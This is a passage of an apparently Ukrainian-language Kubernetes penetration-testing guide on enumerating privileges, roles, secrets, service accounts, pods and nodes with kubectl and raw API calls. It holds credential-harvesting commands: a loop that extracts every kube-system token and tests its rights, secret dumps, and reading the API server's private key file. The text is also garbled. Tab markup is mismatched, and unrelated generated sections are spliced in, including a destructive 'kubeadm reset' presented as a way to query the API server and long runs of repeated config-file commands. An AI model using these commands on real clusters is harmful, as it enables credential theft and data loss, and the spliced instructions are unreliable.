### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –ü–æ—Ç–æ—á–Ω–∏—Ö –ü—Ä–∏–≤—ñ–ª–µ—ó–≤

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
–©–µ –æ–¥–∏–Ω —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤–∞—à—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

–í–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ **Kubernetes RBAC** –≤:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**–Ø–∫ —Ç—ñ–ª—å–∫–∏ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—è, —è–∫—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó** —É –≤–∞—Å —î, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –∑'—è—Å—É–≤–∞—Ç–∏, **—á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ —ó—Ö –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—à—ñ —Ä–æ–ª—ñ

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}## –ü–æ—à—É–∫ API-—Å–µ—Ä–≤–µ—Ä–∞

1. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π API-—Å–µ—Ä–≤–µ—Ä Kubernetes –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `kubectl`:
    ```bash
    kubectl get pods --all-namespaces
    ```

2. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º:
    ```bash
    kubectl proxy --port 8000
    curl http://localhost:8000
    ```

3. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubeadm` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º:
    ```bash
    kubeadm reset
    kubeadm init --pod-network-cidr=10.244.0.0/16
    ```

4. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π API-—Å–µ—Ä–≤–µ—Ä Kubernetes –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `nmap`:
    ```bash
    nmap -p 443 <Kubernetes_IP>
    ```

5. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubelet` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º:
    ```bash
    curl http://<Kubelet_IP>:10250/pods
    ```

## –ü–æ—à—É–∫ API-–æ–±'—î–∫—Ç—ñ–≤

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –¥–æ—Å—Ç—É–ø–Ω–∏—Ö API-–æ–±'—î–∫—Ç—ñ–≤:
    ```bash
    kubectl api-resources
    ```

2. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–µ—Ç–∞–ª—å–Ω–æ—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ API-–æ–±'—î–∫—Ç:
    ```bash
    kubectl explain pods
    ```

3. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Å–ø–∏—Å–∫—É –≤—Å—ñ—Ö –æ–±'—î–∫—Ç—ñ–≤ –ø–µ–≤–Ω–æ–≥–æ —Ç–∏–ø—É:
    ```bash
    kubectl get pods
    ```

4. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–µ—Ç–∞–ª—å–Ω–æ—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –æ–±'—î–∫—Ç:
    ```bash
    kubectl describe pod <pod_name>
    ```

5. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è YAML-–ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞:
    ```bash
    kubectl get pod <pod_name> -o yaml
    ```

6. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:
    ```bash
    kubectl exec -it <pod_name> -- /bin/bash
    ```{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω

Kubernetes –ø—ñ–¥—Ç—Ä–∏–º—É—î **–∫—ñ–ª—å–∫–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –∫–ª–∞—Å—Ç–µ—Ä—ñ–≤**, —â–æ –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ –æ–¥–Ω–æ–º—É —Ñ—ñ–∑–∏—á–Ω–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ. –¶—ñ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∏ –Ω–∞–∑–∏–≤–∞—é—Ç—å—Å—è **–ø—Ä–æ—Å—Ç–æ—Ä–∞–º–∏ —ñ–º–µ–Ω**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}### –ü–æ—à—É–∫ API-—Å–µ—Ä–≤–µ—Ä—ñ–≤

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∫–ª–∞—Å—Ç–µ—Ä–æ–º Kubernetes.
2. –í–∏–∫–æ–Ω–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–ø–∏—Å–æ–∫ –≤—Å—ñ—Ö –¥–æ—Å—Ç—É–ø–Ω–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤:

```bash
kubectl get services --all-namespaces
```

3. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–∂–µ–Ω —Å–µ—Ä–≤—ñ—Å, —â–æ–± –∑–Ω–∞–π—Ç–∏ –º–æ–∂–ª–∏–≤—ñ API-—Å–µ—Ä–≤–µ—Ä–∏.

### –í–∑–∞—î–º–æ–¥—ñ—è –∑ API-—Å–µ—Ä–≤–µ—Ä–∞–º–∏

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl proxy`, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–∏–π –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–∞–º–∏.
2. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –≤–µ–±-–±—Ä–∞—É–∑–µ—Ä —ñ –ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º `http://localhost:8001`.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `kubectx` —Ç–∞ `kubens`

1. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —É—Ç–∏–ª—ñ—Ç—É `kubectx` —Ç–∞ `kubens` –¥–ª—è —à–≤–∏–¥–∫–æ–≥–æ –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è –º—ñ–∂ –∫–ª–∞—Å—Ç–µ—Ä–∞–º–∏ —Ç–∞ –ø—Ä–æ—Å—Ç–æ—Ä–∞–º–∏ —ñ–º–µ–Ω.
2. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ó—Ö –¥–ª—è –∑—Ä—É—á–Ω–æ—ó –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó —Ç–∞ —Ä–æ–±–æ—Ç–∏ –∑ Kubernetes –∫–ª–∞—Å—Ç–µ—Ä–∞–º–∏.

### –ü–æ—à—É–∫ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö –ø–æ—Ä—Ç—ñ–≤

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —É—Ç–∏–ª—ñ—Ç—É `nmap`, —â–æ–± —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –∫–ª–∞—Å—Ç–µ—Ä –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏.
2. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ —É—Å—ñ—Ö –≤—É–∑–ª—ñ–≤ –∫–ª–∞—Å—Ç–µ—Ä–∞:

```bash
nmap -p- <IP-–∞–¥—Ä–µ—Å–∞-–∫–ª–∞—Å—Ç–µ—Ä–∞>
```

3. –ê–Ω–∞–ª—ñ–∑—É–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏, —â–æ–± –∑–Ω–∞–π—Ç–∏ –º–æ–∂–ª–∏–≤—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∞–±–æ —Å–ª—É–∂–±–∏.

### –ü–æ—à—É–∫ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —É—Ç–∏–ª—ñ—Ç—É `kube-hunter`, —â–æ–± –∑–Ω–∞–π—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ Kubernetes –∫–ª–∞—Å—Ç–µ—Ä—ñ.
2. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∫–ª–∞—Å—Ç–µ—Ä–∞:

```bash
kube-hunter --remote <IP-–∞–¥—Ä–µ—Å–∞-–∫–ª–∞—Å—Ç–µ—Ä–∞>
```

3. –ê–Ω–∞–ª—ñ–∑—É–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏, —â–æ–± –≤–∏—è–≤–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ –ø—Ä–æ–±–ª–µ–º–∏ –±–µ–∑–ø–µ–∫–∏.

### –ü–æ—à—É–∫ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤

1. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–ª–∞—Å—Ç–µ—Ä –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤–∏—Ç–æ–∫—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤.
2. –®—É–∫–∞–π—Ç–µ —Ñ–∞–π–ª–∏ —Ç–∏–ø—É `kubeconfig`, —è–∫—ñ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `kubesec`

1. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —É—Ç–∏–ª—ñ—Ç—É `kubesec`, —â–æ–± –∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —Ç–∞ –æ—Ü—ñ–Ω—é–≤–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Kubernetes.
2. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–æ–≥–æ —Ñ–∞–π–ª—É:

```bash
kubesec scan <—à–ª—è—Ö-–¥–æ-—Ñ–∞–π–ª—É>
```

3. –û—Ü—ñ–Ω—ñ—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏, —â–æ–± –≤–∏—è–≤–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ –ø—Ä–æ–±–ª–µ–º–∏ –±–µ–∑–ø–µ–∫–∏.

### –ü–æ—à—É–∫ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —É—Ç–∏–ª—ñ—Ç—É `kube-bench`, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∫–ª–∞—Å—Ç–µ—Ä –Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—è–º –±–µ–∑–ø–µ–∫–∏.
2. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É –±–µ–∑–ø–µ–∫–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞:

```bash
kube-bench
```

3. –ê–Ω–∞–ª—ñ–∑—É–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏, —â–æ–± –≤–∏—è–≤–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–¥–æ—Å–∫–æ–Ω–∞–ª–∏—Ç–∏ –±–µ–∑–ø–µ–∫—É.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ —á–∏—Ç–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä—è–¥–∫–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –∫–æ–∂–Ω–∏–º —Ç–æ–∫–µ–Ω–æ–º:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–±

–Ø–∫ –≤–∂–µ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–æ—Å—è –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏, **–∫–æ–ª–∏ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –ø—ñ–¥–ø—Ä–æ–≥—Ä–∞–º–∞, –∑–∞–∑–≤–∏—á–∞–π —ó–π –ø—Ä–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏**. –¢–æ–º—É –ø–µ—Ä–µ–ª—ñ–∫ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±, —ó—Ö –¥–æ–∑–≤–æ–ª—ñ–≤ —Ç–∞ –º—ñ—Å—Ü—å —ó—Ö –∑–∞–ø—É—Å–∫—É –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è

–†–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ **–∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏**, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ –ü–æ–¥–∏

–ü–æ–¥–∏ - —Ü–µ —Ñ–∞–∫—Ç–∏—á–Ω—ñ **–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏**, —è–∫—ñ –±—É–¥—É—Ç—å **–∑–∞–ø—É—â–µ–Ω—ñ**.

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏

–°–µ—Ä–≤—ñ—Å–∏ Kubernetes –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –≤–∏–∫–ª–∞–¥–µ–Ω–Ω—è —Å–µ—Ä–≤—ñ—Å—É –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –ø–æ—Ä—Ç—É —Ç–∞ IP-–∞–¥—Ä–µ—Å—ñ (—è–∫–∏–π –±—É–¥–µ –≤–∏—Å—Ç—É–ø–∞—Ç–∏ —è–∫ –±–∞–ª–∞–Ω—Å—É–≤–∞–ª—å–Ω–∏–∫ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –∫–∞–ø—Å—É–ª, —è–∫—ñ —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Å–µ—Ä–≤—ñ—Å). –¶–µ —Ü—ñ–∫–∞–≤–æ –∑–Ω–∞—Ç–∏, –¥–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—à—ñ —Å–µ—Ä–≤—ñ—Å–∏ –¥–ª—è —Å–ø—Ä–æ–±–∏ –∞—Ç–∞–∫–∏.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ –≤—É–∑–ª–∏

–û—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ **–≤—É–∑–ª–∏, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}### –ü–æ—à—É–∫ API-—Å–µ—Ä–≤–µ—Ä–∞

1. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubectl` –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ API-—Å–µ—Ä–≤–µ—Ä–æ–º:
    ```bash
    kubectl get pods --all-namespaces
    kubectl get services --all-namespaces
    kubectl get deployments --all-namespaces
    kubectl get nodes
    kubectl get namespaces
    ```

2. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kubelet`:
    ```bash
    cat /var/lib/kubelet/config.yaml
    cat /etc/kubernetes/manifests/kube-apiserver.yaml
    ```

3. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ API-—Å–µ—Ä–≤–µ—Ä–∞:
    ```bash
    cat /etc/kubernetes/pki/apiserver.crt
    cat /etc/kubernetes/pki/apiserver.key
    ```

4. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-apiserver`:
    ```bash
    cat /etc/kubernetes/manifests/kube-apiserver.yaml
    ```

5. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥–æ—Å—Ç—É–ø–Ω—ñ—Å—Ç—å API-—Å–µ—Ä–≤–µ—Ä–∞:
    ```bash
    curl https://<API_SERVER_IP>:<API_SERVER_PORT>
    ```

6. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `kubeadm` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ API-—Å–µ—Ä–≤–µ—Ä:
    ```bash
    kubeadm config view
    ```

7. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-proxy`:
    ```bash
    cat /var/lib/kube-proxy/config.conf
    ```

8. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-controller-manager`:
    ```bash
    cat /etc/kubernetes/manifests/kube-controller-manager.yaml
    ```

9. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-scheduler`:
    ```bash
    cat /etc/kubernetes/manifests/kube-scheduler.yaml
    ```

10. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `etcd`:
    ```bash
    cat /etc/kubernetes/manifests/etcd.yaml
    ```

11. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kubelet`:
    ```bash
    cat /etc/kubernetes/manifests/kubelet.yaml
    ```

12. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-proxy`:
    ```bash
    cat /etc/kubernetes/manifests/kube-proxy.yaml
    ```

13. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `coredns`:
    ```bash
    cat /etc/kubernetes/manifests/coredns.yaml
    ```

14. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-flannel`:
    ```bash
    cat /etc/kubernetes/manifests/kube-flannel.yaml
    ```

15. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `calico`:
    ```bash
    cat /etc/kubernetes/manifests/calico.yaml
    ```

16. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `weave-net`:
    ```bash
    cat /etc/kubernetes/manifests/weave-net.yaml
    ```

17. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-apiserver`:
    ```bash
    cat /etc/kubernetes/manifests/kube-apiserver.yaml
    ```

18. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-controller-manager`:
    ```bash
    cat /etc/kubernetes/manifests/kube-controller-manager.yaml
    ```

19. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kube-scheduler`:
    ```bash
    cat /etc/kubernetes/manifests/kube-scheduler.yaml
    ```

20. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `etcd`:
    ```bash
    cat /etc/kubernetes/manifests/etcd.yaml
    ```

21. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ `kubelet`:
    ```bash
    cat /etc/kubernetes/manifests/kubelet.yaml
    ```

